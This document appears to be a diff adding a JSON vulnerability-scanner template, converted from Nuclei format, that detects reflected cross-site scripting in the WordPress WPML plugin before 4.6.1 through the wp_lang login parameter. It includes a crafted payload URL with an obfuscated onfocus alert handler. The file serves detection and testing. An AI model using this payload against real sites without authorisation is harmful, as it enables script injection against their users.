@@ -1,0 +1,150 @@
+{
+  "id": "wpml-xss",
+  "name": "WordPress Plugin WPML Version \u003c 4.6.1 Cross-Site Scripting",
+  "author": "bugvsme",
+  "severity": "MEDIUM",
+  "description": "WordPress Plugin WPML Version \u003c 4.6.1  is vulnerable to RXSS via wp_lang parameter.\n",
+  "references": [
+    "https://wpml.org/fr/changelog/2023/03/wpml-4-6-1-important-security-update/",
+    "https://twitter.com/bug_vs_me/status/1652789903766200320"
+  ],
+  "tags": [
+    "xss",
+    "wp",
+    "wordpress",
+    "wpml",
+    "wp-plugin"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/wp-login.php?wp_lang\u003den_US%27",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "#039;\"\u003d",
+            "wpml_lang"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wpml-xss",
+    "info": {
+      "name": "WordPress Plugin WPML Version \u003c 4.6.1 Cross-Site Scripting",
+      "author": "bugvsme",
+      "severity": "medium",
+      "description": "WordPress Plugin WPML Version \u003c 4.6.1  is vulnerable to RXSS via wp_lang parameter.\n",
+      "reference": [
+        "https://wpml.org/fr/changelog/2023/03/wpml-4-6-1-important-security-update/",
+        "https://twitter.com/bug_vs_me/status/1652789903766200320"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "xss,wp,wordpress,wpml,wp-plugin"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/wp-login.php?wp_lang\u003den_US%27"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "#039;\"\u003d",
+              "wpml_lang"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ],
+        "extractors": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "host + \"/wp-login.php?wp_lang\u003d%20\u003did\u003dx+type\u003dimage%20id\u003dxss%20onfoc%3C!%3Eusin+alert(domain)%0c\""
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
